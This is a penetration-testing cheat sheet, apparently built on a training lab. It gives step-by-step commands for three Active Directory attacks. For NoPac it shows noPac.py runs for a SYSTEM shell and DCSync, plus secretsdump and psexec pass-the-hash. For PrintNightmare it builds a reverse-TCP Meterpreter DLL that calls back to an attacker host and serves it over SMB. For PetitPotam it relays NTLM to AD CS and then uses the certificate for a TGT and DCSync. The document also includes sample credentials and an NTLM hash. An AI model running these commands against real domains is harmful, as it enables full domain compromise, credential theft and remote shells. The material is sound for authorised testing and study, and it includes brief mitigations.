# Bleeding Edge AD Vulnerabilities — NoPac, PrintNightmare, PetitPotam

> ⚠️ These are advanced attacks. Only attempt in engagements where you understand the risk. PrintNightmare can crash the Print Spooler service. NoPac uses smbexec (noisy, may be blocked by AV/EDR). Always communicate with the client and take detailed notes.

---

## 1. NoPac (SamAccountName Spoofing) — CVE-2021-42278 + CVE-2021-42287

### What It Is
Combines two CVEs for intra-domain privilege escalation from **any standard domain user → Domain Admin** in a single command.

| CVE | Description |
|---|---|
| **CVE-2021-42278** | Bypass in the Security Account Manager (SAM) — allows changing a computer account's SamAccountName to match a DC |
| **CVE-2021-42287** | Vulnerability in Kerberos PAC in AD DS — when the renamed computer requests TGS tickets, they're issued under the DC's name |

**Key prerequisite:** `ms-DS-MachineAccountQuota` must be > 0 (default = 10). If an admin has set it to 0, the attack fails.

### Setup
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
python setup.py install
git clone https://github.com/Ridter/noPac.git
```

### Step 1 — Scan for Vulnerability
```bash
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
Confirms MachineAccountQuota and whether TGT can be obtained from the DC.

### Step 2 — Get a SYSTEM Shell
```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
- Spawns a semi-interactive shell via `smbexec.py` — use **absolute paths only** (no `cd`).
- Saves a `.ccache` ticket to disk for further use.
- Noisy — likely detected by AV/EDR.

### Step 3 — DCSync via noPac (Alternative)
```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator



```

Returns NTLM hash + Kerberos keys for the administrator. Creates a `.ccache` file — clean up afterward.

Grab all hashes in domain using administrator hash
```bash
# Using Impacket's secretsdump to dump all hashes:
impacket-secretsdump -hashes :88ad09182de639ccc6579eb0849751cf INLANEFREIGHT.LOCAL/administrator@172.16.5.5


```

Spawn NT System using administrator hash:
```bash
# **Using Impacket's psexec to spawn a SYSTEM shell:**

impacket-psexec -hashes :88ad09182de639ccc6579eb0849751cf INLANEFREIGHT.LOCAL/administrator@172.16.5.5

```

---

## 2. PrintNightmare — CVE-2021-34527 / CVE-2021-1675

### What It Is
Vulnerabilities in the **Print Spooler service** allowing RCE and privilege escalation. Here used for remote domain compromise — loading a malicious DLL via the spooler service running as SYSTEM on a DC.

### Setup
```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```
> Must use cube0x0's Impacket fork — the standard version won't work.

### Step 1 — Check if Print System protocols are exposed
```bash
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```
Look for: `MS-PAR` (Print System Asynchronous) and `MS-RPRN` (Print System Remote).

### Step 2 — Generate DLL payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

### Step 3 — Host the DLL on an SMB share
```bash
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

### Step 4 — Set up Metasploit handler
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run
```

### Step 5 — Run the exploit
```bash
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
DC fetches and executes the DLL → Meterpreter session opens as `NT AUTHORITY\SYSTEM`.

---

## 3. PetitPotam (MS-EFSRPC) — CVE-2021-36942

### What It Is
**Unauthenticated** LSA spoofing vulnerability that coerces a DC to authenticate to an attacker-controlled host via MS-EFSRPC. When **Active Directory Certificate Services (AD CS)** is in the environment, the relayed authentication can be used to obtain a DC certificate → TGT → DCSync → full domain compromise.

**Attack chain:** Coerce DC auth → relay to AD CS web enrollment → obtain DC certificate → use certificate to get TGT → DCSync

### Step 1 — Start ntlmrelayx.py (relay to AD CS)
```bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

### Step 2 — Run PetitPotam to coerce DC authentication
```bash
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```
- `172.16.5.225` = attack host
- `172.16.5.5` = DC IP

Alternatives: Mimikatz (`misc::efs /server:<DC> /connect:<ATTACK>`), or `Invoke-PetitPotam.ps1`.

### Step 3 — Catch base64-encoded DC certificate in ntlmrelayx output
Copy the base64 certificate blob from the ntlmrelayx output.

### Step 4 — Request TGT using the certificate (Linux)
```bash
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64_blob> dc01.ccache
```
Note the AS-REP encryption key from the output — needed for getnthash.py.

### Step 5 — Export the ccache and DCSync
```bash
export KRB5CCNAME=dc01.ccache
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

### Alternative — Get NT Hash via Kerberos U2U (getnthash.py)
```bash
python /opt/PKINITtools/getnthash.py -key <AS-REP-key> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```
Then DCSync with the hash:
```bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:<NT_hash>
```

### Alternative — Windows (Rubeus pass-the-ticket)
```powershell
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<base64_blob> /ptt
```
Then use Mimikatz to DCSync:
```
lsadump::dcsync /user:inlanefreight\krbtgt
```

### Confirm Domain Admin access
```bash
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

### PetitPotam Mitigations
- Apply patch for CVE-2021-36942.
- Enable **Extended Protection for Authentication** + require SSL on AD CS Web Enrollment / Certificate Enrollment Web Service.
- Disable NTLM authentication on DCs and AD CS servers via Group Policy.
- Disable NTLM for IIS on AD CS servers.
- Review: *Certified Pre-Owned* whitepaper — patching CVE-2021-36942 alone is insufficient if AD CS is still misconfigured.

---

## Summary

| Attack | Auth Required | Impact | Key Tool |
|---|---|---|---|
| **NoPac** | Standard domain user | DA in one command | noPac.py |
| **PrintNightmare** | Standard domain user | SYSTEM on DC | CVE-2021-1675.py |
| **PetitPotam** | **None** (unauthenticated) | Full domain via AD CS + relay | PetitPotam.py + ntlmrelayx.py |

All three result in full domain compromise. Practice in a lab before attempting in a real engagement.